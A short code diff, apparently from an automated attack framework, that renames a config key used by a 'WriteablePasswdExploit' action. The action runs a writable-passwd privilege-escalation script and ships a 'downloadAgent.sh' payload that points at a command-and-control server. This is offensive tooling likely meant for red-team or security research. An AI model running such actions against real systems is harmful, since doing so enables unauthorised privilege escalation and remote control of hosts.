@@ -8,7 +8,7 @@ from incalmo.core.services.config_service import ConfigService
 
 class WriteablePasswdExploit(LowLevelAction):
     def __init__(self, agent: Agent):
-        server = ConfigService().get_config().c2c_server
+        server = ConfigService().get_config().agent_c2c_server
         command = f"bash writeable_passwd.sh {server}"
         payloads = ["downloadAgent.sh", "writeable_passwd.sh"]
         super().__init__(agent, command, payloads, command_delay=3)
